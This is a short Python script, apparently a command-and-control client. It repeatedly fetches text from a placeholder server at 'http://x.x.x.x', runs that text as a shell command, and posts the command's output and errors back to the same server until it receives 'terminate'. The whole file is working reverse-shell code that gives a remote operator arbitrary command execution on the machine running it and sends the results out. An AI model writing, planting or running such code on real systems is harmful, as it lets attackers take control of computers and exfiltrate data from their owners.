#HTTP client

import requests
import subprocess 
import time


while True: 

    req = requests.get('http://x.x.x.x')      # Send GET request to the server
    command = req.text                        # Store the received txt into command variable
        
    if 'terminate' in command:
        break 

    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://x.x.x.x', data=CMD.stdout.read() )  # POST the result 
        post_response = requests.post(url='http://x.x.x.x', data=CMD.stderr.read() )  # or any error

    time.sleep(3)
